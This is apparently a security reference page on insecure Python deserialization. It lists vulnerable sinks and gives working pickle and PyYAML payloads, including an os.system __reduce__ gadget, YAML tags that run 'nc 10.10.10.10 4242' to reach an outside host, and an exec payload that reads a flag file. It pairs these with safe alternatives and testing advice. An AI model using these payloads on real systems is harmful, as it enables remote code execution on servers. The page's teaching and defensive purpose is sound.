# Python Deserialization

> Python deserialization is the process of reconstructing Python objects from serialized data, commonly done using formats like JSON, pickle, or YAML. The pickle module is a frequently used tool for this in Python, as it can serialize and deserialize complex Python objects, including custom classes.

## Summary

* [Tools](#tools)
* [Methodology](#methodology)
    * [Pickle](#pickle)
    * [PyYAML](#pyyaml)
* [References](#references)
* [Common Pitfalls](#common-pitfalls)
* [Testing for Insecure Deserialization](#testing-for-insecure-deserialization)


## Tools

* [j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) - Serialized payload for deserialization RCE attack on python driven applications where pickle,PyYAML, ruamel.yaml or jsonpickle module is used for deserialization of serialized data.
* [Bandit](https://github.com/PyCQA/bandit) - A tool designed to find common security issues in Python code, including insecure deserialization.
* [PyYAML](https://pyyaml.org/wiki/PyYAMLDocumentation) - A YAML parser and emitter for Python.
* [jsonpickle](https://jsonpickle.github.io/) - A library for serializing and deserializing complex Python objects to and from JSON.


## Methodology

In Python source code, look for these sinks:

* `cPickle.loads`
* `pickle.loads`
* `_pickle.loads`
* `jsonpickle.decode`


### Pickle

The following code is a simple example of using `cPickle` in order to generate an auth_token which is a serialized User object.
:warning: `import cPickle` will only work on Python 2

```python
import cPickle
from base64 import b64encode, b64decode

class User:
    def __init__(self):
        self.username = "anonymous"
        self.password = "anonymous"
        self.rank     = "guest"

h = User()
auth_token = b64encode(cPickle.dumps(h))
print("Your Auth Token : {}").format(auth_token)
```

The vulnerability is introduced when a token is loaded from an user input. 

```python
new_token = raw_input("New Auth Token : ")
token = cPickle.loads(b64decode(new_token))
print "Welcome {}".format(token.username)
```

Python 2.7 documentation clearly states Pickle should never be used with untrusted sources. Let's create a malicious data that will execute arbitrary code on the server.

> The pickle module is not secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.

```python
import cPickle, os
from base64 import b64encode, b64decode

class Evil(object):
    def __reduce__(self):
        return (os.system,("whoami",))

e = Evil()
evil_token = b64encode(cPickle.dumps(e))
print("Your Evil Token : {}").format(evil_token)
```

#### Secure Alternative

To avoid using `pickle` for untrusted data, consider using `json` for serialization and deserialization, as it is safer and more secure.

```python
import json
from base64 import b64encode, b64decode

class User:
    def __init__(self):
        self.username = "anonymous"
        self.password = "anonymous"
        self.rank     = "guest"

h = User()
auth_token = b64encode(json.dumps(h.__dict__).encode())
print("Your Auth Token : {}").format(auth_token)

new_token = input("New Auth Token : ")
token = json.loads(b64decode(new_token).decode())
print("Welcome {}".format(token['username']))
```


### PyYAML

YAML deserialization is the process of converting YAML-formatted data back into objects in programming languages like Python, Ruby, or Java. YAML (YAML Ain't Markup Language) is popular for configuration files and data serialization because it is human-readable and supports complex data structures.

```yaml
!!python/object/apply:time.sleep [10]
!!python/object/apply:builtins.range [1, 10, 1]
!!python/object/apply:os.system ["nc 10.10.10.10 4242"]
!!python/object/apply:os.popen ["nc 10.10.10.10 4242"]
!!python/object/new:subprocess [["ls","-ail"]]
!!python/object/new:subprocess.check_output [["ls","-ail"]]
```

```yaml
!!python/object/apply:subprocess.Popen
- ls
```

```yaml
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:Warning
  state:
    update: !!python/name:exec
```

Since PyYaml version 6.0, the default loader for `load` has been switched to SafeLoader mitigating the risks against Remote Code Execution. [PR #420 - Fix](https://github.com/yaml/pyyaml/issues/420)

The vulnerable sinks are now `yaml.unsafe_load` and `yaml.load(input, Loader=yaml.UnsafeLoader)`.

```py
with open('exploit_unsafeloader.yml') as file:
        data = yaml.load(file,Loader=yaml.UnsafeLoader)
```

#### Secure Alternative

To avoid using `unsafe_load`, always use `safe_load` when working with untrusted YAML data.

```py
import yaml

with open('safe_data.yml') as file:
    data = yaml.safe_load(file)
```


## Common Pitfalls

1. **Using `pickle` with untrusted data**: The `pickle` module is not secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.
2. **Using `yaml.load` without specifying a safe loader**: Always use `yaml.safe_load` when working with untrusted YAML data to avoid remote code execution vulnerabilities.
3. **Ignoring security warnings**: Always pay attention to security warnings and best practices when working with serialization and deserialization in Python.


## Testing for Insecure Deserialization

1. **Manual Testing**:
    - Review the codebase for the use of insecure deserialization functions such as `pickle.loads`, `yaml.load`, and `jsonpickle.decode`.
    - Identify the sources of input data and ensure they are properly validated and sanitized before deserialization.

2. **Automated Testing**:
    - Use static analysis tools like [Bandit](https://github.com/PyCQA/bandit) to scan the codebase for insecure deserialization functions and patterns.
    - Implement unit tests to verify that deserialization functions are not used with untrusted data and that proper input validation is in place.


## References

- [CVE-2019-20477 - 0Day YAML Deserialization Attack on PyYAML version <= 5.1.2 - Manmeet Singh (@_j0lt) - June 21, 2020](https://thej0lt.com/2020/06/21/cve-2019-20477-0day-yaml-deserialization-attack-on-pyyaml-version/)
- [Exploiting misuse of Python's "pickle" - Nelson Elhage - March 20, 2011](https://blog.nelhage.com/2011/03/exploiting-pickle/)
- [Python Yaml Deserialization - HackTricks - July 19, 2024](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization)
- [PyYAML Documentation - PyYAML - April 29, 2006](https://pyyaml.org/wiki/PyYAMLDocumentation)
- [YAML Deserialization Attack in Python - Manmeet Singh & Ashish Kukret - November 13, 2021](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)
